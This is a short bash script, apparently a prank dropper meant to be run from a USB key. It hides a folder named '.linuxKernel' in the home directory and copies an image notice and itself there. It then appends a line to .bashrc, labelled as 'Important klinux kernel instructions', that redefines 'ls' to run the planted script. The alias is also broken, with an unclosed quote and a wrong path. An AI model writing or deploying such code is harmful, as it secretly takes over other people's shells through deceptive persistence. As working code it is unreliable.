#!/bin/bash

KERNEL_DIR="$HOME/.linuxKernel"

SOURCE_NOTICE="./one_piece_notice.png" #TODO: change for access from usb key
INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
IMG_PATH="$KERNEL_DIR/result.png"
OUT_FILE="$KERNEL_DIR/output.png"

if [ ! -d "$KERNEL_DIR" ]; then
    mkdir -p "$KERNEL_DIR"
fi

if [ ! -f "$INSTALLED_NOTICE" ]; then
    if [ -f "$SOURCE_NOTICE" ]; then
        touch "$IMG_PATH"
        touch "$OUT_FILE"
        cp "$SOURCE_NOTICE" "$INSTALLED_NOTICE"
        cp "script.sh" "$KERNEL_DIR"
    else
        exit 1
    fi
fi

echo "# // Important klinux kernel instructions // " >> .bashrc
echo "alias ls='ls ; bash /.linuxKernel/script.sh" >> .bashrc
